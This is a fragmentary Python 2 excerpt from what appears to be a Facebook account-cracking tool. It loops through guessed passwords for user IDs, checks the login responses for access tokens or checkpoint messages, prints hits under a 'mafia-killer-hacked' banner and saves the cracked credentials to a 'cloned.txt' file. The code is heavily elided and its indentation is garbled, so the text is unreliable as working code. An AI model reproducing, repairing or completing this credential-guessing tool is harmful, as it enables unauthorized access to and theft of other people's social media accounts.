					...
					cpb.append(c+user+pass1)
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 				            ...
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m[mafia-kilker-hacked]  ' + k + c + user + '  |  ' + pass3
 				                okb = open('save/cloned.txt', 'a')
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;93m[open after 7 days] ' + k + c + user + '  |  ' + pass3
 					                cps = open('save/cloned.txt', 'a')
 				                    ...
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m[mafia-killer-hacked]  ' + k + c + user + '  |  ' + pass4
 				                        okb = open('save/cloned.txt', 'a')
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;93m[open after 7 days] ' + k + c + user + '  |  ' + pass4
 					                        cps = open('save/cloned.txt', 'a')
 					                        ...
 					                        cpb.append(c+user+pass4)
 				                                       ...
 				                                       q = json.load(data)
 				                                       if 'access_token' in q:
 				                                          print '\x1b[1;92m[mafia-killer-hacked]  ' + k + c + user + '  |  ' + pass5
 				                                          okb = open('save/cloned.txt', 'a')
 				                                          ...
 				                                          oks.append(c+user+pass5)
                                                                       	...
                                                                       	if 'www.facebook.com' in q['error_msg']:
 					                                                    print '\033[1;93m[open after 7 days] ' + k + c + user + '  |  ' + pass5
 					                                                    cps = open('save/cloned.txt', 'a')
